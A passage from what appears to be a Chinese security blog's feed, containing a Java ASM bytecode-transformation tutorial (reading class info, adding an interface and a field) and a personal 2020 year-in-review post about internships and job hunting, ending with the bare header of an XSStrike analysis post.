class="line">        inputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        copy(inputStream,  byteArrayOutputStream);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//（1）构建ClassReader</span></span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (2) 调用getXxx()方法</span></span><br><span class="line">        <span class="keyword">int</span> access = cr.getAccess();</span><br><span class="line">        System.out.println(<span class="string">"access: "</span> + access);</span><br><span class="line"></span><br><span class="line">        String className = cr.getClassName();</span><br><span class="line">        System.out.println(<span class="string">"className: "</span> + className);</span><br><span class="line"></span><br><span class="line">        String superName = cr.getSuperName();</span><br><span class="line">        System.out.println(<span class="string">"superName: "</span> + superName);</span><br><span class="line"></span><br><span class="line">        String[] interfaces = cr.getInterfaces();</span><br><span class="line">        System.out.println(<span class="string">"interfaces: "</span> + Arrays.toString(interfaces));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(InputStream source, OutputStream target)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8192</span>];</span><br><span class="line">        <span class="keyword">int</span> length;</span><br><span class="line">        <span class="keyword">while</span> ((length = source.read(buf)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            target.write(buf, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">access: 33</span><br><span class="line">className: sample/HelloWorld</span><br><span class="line">superName: java/lang/Exception</span><br><span class="line">interfaces: [java/io/Serializable, java/lang/Cloneable]</span><br></pre></td></tr></table></figure></li></ul><h2 id="转换一个类"><a href="#转换一个类" class="headerlink" title="转换一个类"></a>转换一个类</h2><ul><li><code>ClassReader</code>类，是ASM提供的一个类，可以直接拿来使用。</li><li><code>ClassWriter</code>类，是ASM提供的一个类，可以直接拿来使用。</li><li><code>ClassVisitor</code>类，是ASM提供的一个抽象类，因此需要写代码提供一个<code>ClassVisitor</code>的子类，在这个子类当中可以实现对<code>.class</code>文件进行各种处理操作。</li></ul><h3 id="为HelloWorld类添加接口"><a href="#为HelloWorld类添加接口" class="headerlink" title="为HelloWorld类添加接口"></a>为HelloWorld类添加接口</h3><ul><li><p>编写HelloWorld.java类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sample;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>初始的HelloWorld.class文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> sample;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorld</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>通过ASM的<code>ClassReader</code>、<code>ClassWriter</code>、<code>ClassVisitor</code>类对HelloWorld类进行转换，为其添加一个实现接口</p></li><li><p>编写HelloWorldCloneVisitor类继承ClassVisitor类来实现具体功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> run;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassVisitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldCloneVisitor</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorldCloneVisitor</span><span class="params">(<span class="keyword">int</span> api, ClassVisitor classVisitor)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(api, classVisitor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写visit方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature, String superName, String[] interfaces)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.visit(version, access, name, signature, superName, <span class="keyword">new</span> String[]&#123;<span class="string">"java/lang/Cloneable"</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编写HelloWorldTransform转换已有的class文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> run;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldTransform</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 获取Class绝对路径</span></span><br><span class="line">        String relativePath = <span class="string">"sample/HelloWorld.class"</span>;</span><br><span class="line">        String absolutePath = HelloWorldRun.class.getResource("/").getPath() + relativePath;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取字节</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(absolutePath);</span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        inputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        copy(inputStream,  byteArrayOutputStream);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//（1）构建ClassReader</span></span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(bytes1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//（2）构建ClassWriter</span></span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_FRAMES);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//（3）串连ClassVisitor</span></span><br><span class="line">        <span class="keyword">int</span> api = Opcodes.ASM9;</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> HelloWorldCloneVisitor(api, cw);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//（4）结合ClassReader和ClassVisitor</span></span><br><span class="line">        <span class="keyword">int</span> parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;</span><br><span class="line">        cr.accept(cv, parsingOptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//（5）生成byte[]</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes2 = cw.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (6) 重新写入class文件</span></span><br><span class="line">        OutputStream outputStream = <span class="keyword">new</span> FileOutputStream(absolutePath);</span><br><span class="line">        BufferedOutputStream bufferedOutputStream = <span class="keyword">new</span> BufferedOutputStream(outputStream);</span><br><span class="line">        bufferedOutputStream.write(bytes2);</span><br><span class="line">        bufferedOutputStream.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(InputStream source, OutputStream target)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8192</span>];</span><br><span class="line">        <span class="keyword">int</span> length;</span><br><span class="line">        <span class="keyword">while</span> ((length = source.read(buf)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            target.write(buf, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>转换后的HelloWorld.class文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> sample;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorld</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="为HelloWorld类添加字段"><a href="#为HelloWorld类添加字段" class="headerlink" title="为HelloWorld类添加字段"></a>为HelloWorld类添加字段</h3><ul><li><p>编写HelloWorld.java类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sample;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>初始的HelloWorld.class文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> sample;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorld</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编写HelloWorldAddFieldVisitor类继承ClassVisitor类来实现具体功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> run;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.FieldVisitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldAddFieldVisitor</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> fieldAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String fieldName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String fieldDesc;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> isFieldPresent;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorldAddFieldVisitor</span><span class="params">(<span class="keyword">int</span> api, ClassVisitor classVisitor, <span class="keyword">int</span> fieldAccess, String fieldName, String fieldDesc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(api, classVisitor);</span><br><span class="line">        <span class="comment">// 字段访问标识</span></span><br><span class="line">        <span class="keyword">this</span>.fieldAccess = fieldAccess;</span><br><span class="line">        <span class="comment">// 字段名称</span></span><br><span class="line">        <span class="keyword">this</span>.fieldName = fieldName;</span><br><span class="line">        <span class="comment">// 字段描述符</span></span><br><span class="line">        <span class="keyword">this</span>.fieldDesc = fieldDesc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> FieldVisitor <span class="title">visitField</span><span class="params">(<span class="keyword">int</span> access, String name, String descriptor, String signature, Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(fieldName)) &#123;</span><br><span class="line">            isFieldPresent = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.visitField(access, name, descriptor, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isFieldPresent) &#123;</span><br><span class="line">            FieldVisitor fv = <span class="keyword">super</span>.visitField(fieldAccess, fieldName, fieldDesc, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (fv != <span class="keyword">null</span>) &#123;</span><br><span class="line">                fv.visitEnd();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编写HelloWorldTransform转换已有的class文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> run;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldTransform</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 获取Class绝对路径</span></span><br><span class="line">        String relativePath = <span class="string">"sample/HelloWorld.class"</span>;</span><br><span class="line">        String absolutePath = HelloWorldRun.class.getResource("/").getPath() + relativePath;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取字节</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(absolutePath);</span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        inputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        copy(inputStream,  byteArrayOutputStream);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//（1）构建ClassReader</span></span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(bytes1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//（2）构建ClassWriter</span></span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_FRAMES);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//（3）串连ClassVisitor</span></span><br><span class="line">        <span class="keyword">int</span> api = Opcodes.ASM9;</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> HelloWorldAddFieldVisitor(api, cw, Opcodes.ACC_PUBLIC, <span class="string">"objValue"</span>, <span class="string">"Ljava/lang/Object;"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//（4）结合ClassReader和ClassVisitor</span></span><br><span class="line">        <span class="keyword">int</span> parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;</span><br><span class="line">        cr.accept(cv, parsingOptions);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//（5）生成byte[]</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes2 = cw.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (6) 重新写入class文件</span></span><br><span class="line">        OutputStream outputStream = <span class="keyword">new</span> FileOutputStream(absolutePath);</span><br><span class="line">        BufferedOutputStream bufferedOutputStream = <span class="keyword">new</span> BufferedOutputStream(outputStream);</span><br><span class="line">        bufferedOutputStream.write(bytes2);</span><br><span class="line">        bufferedOutputStream.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(InputStream source, OutputStream target)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8192</span>];</span><br><span class="line">        <span class="keyword">int</span> length;</span><br><span class="line">        <span class="keyword">while</span> ((length = source.read(buf)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            target.write(buf, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>转换后的HelloWorld.class文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> sample;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object objValue;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorld</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IAST前置知识，使用ASM进行字节码增强&lt;/p&gt;
    
    </summary>
    
    
      <category term="ASM" scheme="https://www.sys71m.top/categories/ASM/"/>
    
    
      <category term="ASM" scheme="https://www.sys71m.top/tags/ASM/"/>
    
      <category term="IAST" scheme="https://www.sys71m.top/tags/IAST/"/>
    
      <category term="Java" scheme="https://www.sys71m.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2020年都干了啥</title>
    <link href="https://www.sys71m.top/2020/12/28/2020%E5%B9%B4%E9%83%BD%E5%B9%B2%E4%BA%86%E5%95%A5/"/>
    <id>https://www.sys71m.top/2020/12/28/2020%E5%B9%B4%E9%83%BD%E5%B9%B2%E4%BA%86%E5%95%A5/</id>
    <published>2020-12-28T04:13:51.000Z</published>
    <updated>2020-12-28T04:28:54.702Z</updated>
    
    <content type="html"><![CDATA[<p>确实没想到，因为疫情的关系，2020开年经历了求学以来最长的寒假~</p><a id="more"></a>  <h3 id="漫长的寒假"><a href="#漫长的寒假" class="headerlink" title="漫长的寒假"></a>漫长的寒假</h3><p>寒假期间闲来无事，部分时间是在玩LOL中度过，也就玩玩匹配和大乱斗。除去打游戏的时间，期间写了一个<a href="https://github.com/ttonys/Scrapy-CVE-CNVD" target="_blank" rel="noopener">漏洞监控</a>的小工具，做了做代码审计，幸运的捡到几个漏网之鱼，都已上报给了CNVD。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/NO1/image-20201228113248832.png" alt="image-20201228113248832"></p><h3 id="准备找实习"><a href="#准备找实习" class="headerlink" title="准备找实习"></a>准备找实习</h3><p>即将由大三步入大四，由于没准备考研，随打算利用暑假的时间去找些实习。不得不说，因为疫情的关系发现实习岗位有明显的减少，好在找到了一家杭州的互联网公司Zoom，主要是做视频会议的。因为是实习，总共经历了三面，两轮技术面和一轮HR面，进去后发现一面是我所在部门的manager，二面是杭州地区的leader。</p><p>面试的问题也相对比较简单，一面是实操+安全概念+算法，给的漏洞环境是基于DVWA的，现场演示了注入，xss和命令执行这个漏洞的利用过程，安全概念也是常规的top10漏洞，算法没做出来，好在还是过了！二面是一些比赛经历，因人而异。</p><h3 id="Zoom实习"><a href="#Zoom实习" class="headerlink" title="Zoom实习"></a>Zoom实习</h3><p>去实习的时间是在学校放暑假之后，7月-10月实习了三个月，因为是外企，几乎没有加班，工作的环境和氛围也相对轻松。我所在的的部门是安全部，工作的大部分内容是漏洞挖掘和安全工具开发，平时也是自己钻研，研究网上开源的安全工具，多多少少提升了代码的阅读能力，关于工作的具体细节就不多说了。</p><h3 id="准备秋招"><a href="#准备秋招" class="headerlink" title="准备秋招"></a>准备秋招</h3><p>秋招是最难的一段时间，相比较找实习来说，一般分为3轮技术和一轮HR面，面试难度会有所上升，并且面试的周期也回有所加长，有的公司投了没回应，有的面到一半没回信，这都是正常的事情，但还是会对找工作的信心有所打击。这期间也投了不少公司，最终收获到了一份比较满意的offer。</p><h3 id="回校-amp-考驾照"><a href="#回校-amp-考驾照" class="headerlink" title="回校&amp;考驾照"></a>回校&amp;考驾照</h3><p>学校的大部分课程都已结课，打算利用这段时间把驾照学出来，顺便再空闲之余学习一些开发方面的知识（主要在看的是&lt;&lt;sping实战&gt;&gt;和&lt;&lt;sping微服务实战&gt;&gt;），一直做黑盒的话无异于盲人摸象，多熟悉熟悉开发对于日后的工作也是有好处的~</p><h3 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h3><p>努力学习，天天向上~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;确实没想到，因为疫情的关系，2020开年经历了求学以来最长的寒假~&lt;/p&gt;
    
    </summary>
    
    
      <category term="日常" scheme="https://www.sys71m.top/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
      <category term="总结" scheme="https://www.sys71m.top/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="日常" scheme="https://www.sys71m.top/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>XSStrike源码分析-下</title>
    <link href="https://www.sys71m.top/2020/08/31/XSStrike%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E4%B8%8B/"/>
    <id>https://www.sys71m.top/2020/08/31/XSStrike%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E4%B8%8B/</id>
    <published>2020-08-30T16:15:50.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
